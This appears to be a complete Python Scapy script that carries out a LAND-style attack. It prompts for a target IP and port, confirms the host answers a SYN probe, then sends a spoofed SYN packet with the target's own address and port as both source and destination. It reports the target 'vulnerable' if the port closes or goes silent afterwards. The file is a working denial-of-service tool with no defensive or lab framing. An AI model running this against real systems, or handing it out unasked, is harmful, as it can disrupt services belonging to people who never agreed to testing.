from scapy.layers.inet import *
from scapy.all import *

# Holds target IP-address.

ip = input("Please enter the targets IP-address (IPv4): ")
port = int(input("Please enter the port you wish to target: "))
program_running = True

def probe():
    
    # This packet is sent to probe the target. 
    probe = sr1(IP(dst=ip)/TCP(dport=port, flags= 'S'),timeout= 10)
    if probe:
        return True
    else:
        return False

while program_running:

    print("\nChecking if target is online and responding..\n")
    test = probe()
    
    if test == True:
        print("\nTarget is up and running.. Sending spoofed packet to target..\n")

        # This sends a spoofed packet to the target. 
        spoof = sr1(IP(src=ip,dst=ip)/TCP(sport=port,dport=port,flags = 'S'),timeout=1)
        print("\nProbing port..\n")

        # This sends another packet to check if the port is still open or if it closed.
        # If timeout the target is also vulnerable.
        pCheck = sr1(IP(dst=ip)/TCP(dport=port,flags = 'S'),timeout = 5)
       
      
        if pCheck:
            flag = str(pCheck[TCP].flags)

            if flag == "RA":
                print("\nTarget is vulnerable. Port got closed. received flag: " + flag + "\n")
                program_running = False

            elif flag == "SA":
                print("\nTarget isn't vulnerable on this port because port is still open.")
                print("Recieved flag: " + flag)
                program_running = False

            else:
                print("\n Target is vulnerable.\n")
                program_running = False
        else:
            print("\nTarget is vulnerable.\n")
            program_running = False

    else:
        print("\n Exiting.. \n Contact couldn't be established.\n")
        program_running = False
        
